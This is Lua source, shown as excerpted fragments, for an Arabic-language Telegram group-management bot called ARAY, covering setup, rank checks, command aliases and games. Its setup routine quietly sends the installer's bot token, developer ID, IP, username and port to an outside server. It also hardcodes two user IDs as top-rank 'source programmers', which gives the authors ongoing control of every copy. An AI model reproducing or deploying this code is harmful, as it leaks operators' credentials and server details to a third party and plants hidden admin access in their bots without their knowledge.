------------------------------------------------
-- This Source Was Developed By (Rio) @BH_U1.--
--   This Is The Source Channel @sxj3z .   --
--                - ARAY -                 --
--        -- https://t.me/sxj3z --         --
------------------------------------------------ 
...
if not DevRio:get(Server.."IdARAY") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevRio:set(Server.."IdARAY",DevId) 
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end 
os.execute('lua ARAY.lua') 
end 
if not DevRio:get(Server.."TokenARAY") then 
...
DevRio:set(Server.."TokenARAY",TokenBot) 
end  
else 
...
Config = {
DevId = DevRio:get(Server.."IdARAY"),
TokenBot = DevRio:get(Server.."TokenARAY"),
ARAY = DevRio:get(Server.."TokenARAY"):match("(%d+)"),
SudoIds = {DevRio:get(Server.."IdARAY")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/David/index.php?Get=ARAY&DevId="..DevRio:get(Server.."IdARAY").."&TokenBot="..DevRio:get(Server.."TokenARAY").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("ARAY.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/ARAY
token="]]..DevRio:get(Server.."TokenARAY")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
...
./tg -s ./ARAY.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S ARAY -X kill
screen -S ARAY ./ARAY.sh
done
]]) 
file:close() 
...
local Load_ARAY = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevRio:del(Server.."IdARAY");DevRio:del(Server.."TokenARAY")
end 
...
DevId = Config.DevId
SudoIds = {Config.SudoIds,1692631901,1873723582}
ARAY = Config.ARAY
TokenBot = Config.TokenBot
NameBot = (DevRio:get(ARAY..'Rio:NameBot') or 'روتانا')
--     Source ARAY     --
...
local Status = DevRio:sismember(ARAY..'Rio:RioSudo:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(ARAY..'Rio:SecondSudo:',msg.sender_user_id_) 
...
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(ARAY) then  
var = true  
end  
return var  
end 
...
local Status = DevRio:sismember(ARAY..'Rio:SudoBot:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(ARAY..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
----   Owner   ----
function Owner(msg) 
local Status = DevRio:sismember(ARAY..'Rio:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(ARAY..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(ARAY..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(ARAY..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(ARAY..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(ARAY..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(ARAY..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(ARAY..'Rio:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
if DevRio:sismember(ARAY..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(ARAY..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(ARAY..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(ARAY..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
...
--     Source ARAY     --
function ARAYFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.ARAY and msg then
FilesText = plugin.ARAY(msg)
end
end
end
...
if File_Name:lower():match('(%d+)') ~= ARAY:lower() then 
...
local info_file = io.open('./'..ARAY..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevRio:set(ARAY.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevRio:sadd(ARAY.."Rio:Groups",IdGps) 
DevRio:set(ARAY.."Rio:Lock:Bots"..IdGps,"del") DevRio:hset(ARAY.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevRio:set(ARAY..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevRio:sadd(ARAY..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevRio:sadd(ARAY..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevRio:sadd(ARAY..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevRio:sadd(ARAY..'Rio:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevRio:sadd(ARAY..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevRio:sadd(ARAY..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevRio:set(ARAY.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevRio:set(ARAY.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
...
--     Source ARAY     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then ARAYTeam  = "المطور" elseif RioSudo(msg) then ARAYTeam = "المطور" elseif SecondSudo(msg) then ARAYTeam = "المطور" elseif SudoBot(msg) then ARAYTeam = "المطور" elseif Manager(msg) then ARAYTeam = "المدير" elseif Admin(msg) then ARAYTeam = "الادمن" else ARAYTeam = "العضو" end return ARAYTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1692631901) then ARAYTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1873723582) then ARAYTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(ARAY) then ARAYTeam = 'البوت' elseif SudoId(user_id) then ARAYTeam = 'المطور الاساسي' elseif DevRio:sismember(ARAY..'Rio:RioSudo:', user_id) then ARAYTeam = 'المطور الاساسي' elseif DevRio:sismember(ARAY..'Rio:SecondSudo:', user_id) then ARAYTeam = 'المطور الاساسي²' elseif DevRio:sismember(ARAY..'Rio:SudoBot:', user_id) then ARAYTeam = DevRio:get(ARAY.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(ARAY..'Rio:RioConstructor:'..chat_id, user_id) then ARAYTeam = 'المالك' elseif DevRio:sismember(ARAY..'Rio:Owner:', user_id) then ARAYTeam = 'المالك' elseif DevRio:sismember(ARAY..'Rio:BasicConstructor:'..chat_id, user_id) then ARAYTeam = DevRio:get(ARAY.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(ARAY..'Rio:Constructor:'..chat_id, user_id) then ARAYTeam = DevRio:get(ARAY.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(ARAY..'Rio:Managers:'..chat_id, user_id) then ARAYTeam = DevRio:get(ARAY.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(ARAY..'Rio:Admins:'..chat_id, user_id) then ARAYTeam = DevRio:get(ARAY.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(ARAY..'Rio:VipMem:'..chat_id, user_id) then  ARAYTeam = DevRio:get(ARAY.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(ARAY..'Rio:Cleaner:'..chat_id, user_id) then  ARAYTeam = DevRio:get(ARAY.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else ARAYTeam = DevRio:get(ARAY.."Rio:mem:Rd"..chat_id) or 'العضو' end return ARAYTeam end
--     Source ARAY     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(ARAY) then  
var = true
elseif DevRio:sismember(ARAY..'Rio:RioSudo:', user_id) then
var = true
elseif DevRio:sismember(ARAY..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevRio:sismember(ARAY..'Rio:SudoBot:', user_id) then
var = true 
elseif DevRio:sismember(ARAY..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(ARAY..'Rio:Owner:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(ARAY..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(ARAY..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(ARAY..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(ARAY..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(ARAY..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
local rio = (ARAY..'Rio:Filters:'..msg.chat_id_)
if rio then
...
local UserName = (dp.username_ or "sxj3z")
...
--     Source ARAY     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevRio:get(ARAY..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source ARAY     --
function ChCheck(msg)
local var = true 
if DevRio:get(ARAY.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevRio:get(ARAY..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevRio:get(ARAY..'Rio:ChText') then
local ChText = DevRio:get(ARAY..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(ARAY.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevRio:get(ARAY..'yes'..data.sender_user_id_) == 'delyes' then
DevRio:del(ARAY..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(ARAY..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and DevRio:get(ARAY..'no'..data.sender_user_id_) == 'delno' then
DevRio:del(ARAY..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(ARAY..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "↯︙تم الغاء امر اطردني") 
end
--     Source ARAY     --
if DataText == '/yesdel' and DevRio:get(ARAY..'yesdel'..data.sender_user_id_) == 'delyes' then
DevRio:del(ARAY..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(ARAY..'nodel'..data.sender_user_id_, 'delno')
if DevRio:sismember(ARAY..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(ARAY..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevRio:sismember(ARAY..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(ARAY..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(ARAY..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevRio:sismember(ARAY..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevRio:sismember(ARAY..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(ARAY..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(ARAY..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(ARAY..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(ARAY..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(ARAY..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevRio:srem(ARAY..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(ARAY..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(ARAY..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(ARAY..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(ARAY..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(ARAY..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
if DevRio:get(ARAY.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "↯︙تم الغاء امر تغير المطور الاساسي") 
DevRio:del(ARAY.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevRio:get(ARAY.."Rio:NewDev"..data.sender_user_id_)
...
if DataText == '/nodel' and DevRio:get(ARAY..'nodel'..data.sender_user_id_) == 'delno' then
DevRio:del(ARAY..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(ARAY..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "↯︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevRio:get(ARAY.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevRio:smembers(ARAY..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevRio:incrby(ARAY..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevRio:del(ARAY..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(ARAY.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "↯︙*صاحب الحظ* ↫ ["..UserName.."]\n↯︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevRio:del(ARAY..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(ARAY.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevRio:del(ARAY.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevRio:sismember(ARAY..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(ARAY..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DevRio:del(ARAY..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:srem(ARAY..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(ARAY..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevRio:get(ARAY..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "↯︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Rio) 
DevRio:del(ARAY..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevRio:del(ARAY..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:del(ARAY..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(ARAY..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "↯︙عذرا صلاحية الامر منتهيه !") 
end
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(ARAY..'Rio:Help')
local Text = [[
...
↯︙م6 ↫ اوامر الاعضاء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↯︙[Source Channel](https://t.me/sxj3z)
]] 
keyboard = {} 
...
local Help = DevRio:get(ARAY..'Rio:Help1')
local Text = [[
...
local Help = DevRio:get(ARAY..'Rio:Help2')
local Text = [[
↯︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↯︙الاعدادت
...
local Help = DevRio:get(ARAY..'Rio:Help3')
local Text = [[
↯︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↯︙فحص البوت
...
local Help = DevRio:get(ARAY..'Rio:Help4')
local Text = [[
↯︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↯︙تنزيل الكل
...
local Help = DevRio:get(ARAY..'Rio:Help5')
local Text = [[
↯︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↯︙الكروبات
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(ARAY..'Rio:Help6')
local Text = [[
↯︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
...
if text and DevRio:get(ARAY.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevRio:get(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevRio:del(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevRio:del(ARAY.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:srem(ARAY.."List:Cmd:Group:New"..msg.chat_id_,text)
...
DevRio:del(ARAY.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevRio:get(ARAY..'Rio:NameBot') or "روتانا")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevRio:get(ARAY..'Rio:NameBot') or "روتانا")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevRio:get(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevRio:get(ARAY.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevRio:set(ARAY.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙ارسل الامر الجديد", 1, 'html')
DevRio:del(ARAY.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevRio:set(ARAY.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevRio:get(ARAY.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevRio:get(ARAY.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ الامر", 1, 'html')
DevRio:del(ARAY.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevRio:smembers(ARAY.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "↯︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevRio:get(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
local List = DevRio:smembers(ARAY.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevRio:del(ARAY.."List:Cmd:Group:New"..msg.chat_id_)
end
...
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevRio:set(ARAY.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevRio:sadd(ARAY.."List:Cmd:Group:New"..msg.chat_id_,"#")
...
DevRio:set(ARAY.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevRio:set(ARAY.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local List = DevRio:smembers(ARAY.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevRio:get(ARAY.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevRio:smembers(ARAY.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(ARAY.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevRio:del(ARAY.."Coomds"..msg.chat_id_)
end
...
DevRio:set(ARAY.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevRio:sadd(ARAY.."Coomds"..msg.chat_id_,ComdNew)  
DevRio:setex(ARAY.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n↯︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevRio:del(ARAY.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حذف الصلاحيه", 1, 'html')
end
if DevRio:get(ARAY.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء الامر", 1, 'html')
DevRio:del(ARAY.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevRio:get(ARAY.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevRio:set(ARAY.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
...
if DevRio:sismember(ARAY.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(ARAY.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sxj3z')..')'..' ❩\n↯︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevRio:sadd(ARAY..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sxj3z')..')'..' ❩\n↯︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevRio:sadd(ARAY..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sxj3z')..')'..' ❩\n↯︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
